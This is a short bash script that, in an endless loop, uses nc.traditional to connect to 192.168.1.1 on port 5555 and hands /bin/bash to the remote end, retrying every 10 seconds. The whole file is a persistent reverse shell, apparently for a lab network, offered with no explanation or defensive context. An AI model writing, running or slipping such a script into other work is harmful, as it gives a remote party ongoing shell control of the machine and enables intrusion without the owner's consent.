#!/usr/bin/env bash
while [ 1 ]
do
  nc.traditional 192.168.1.1 5555 -e /bin/bash
  sleep 10
done
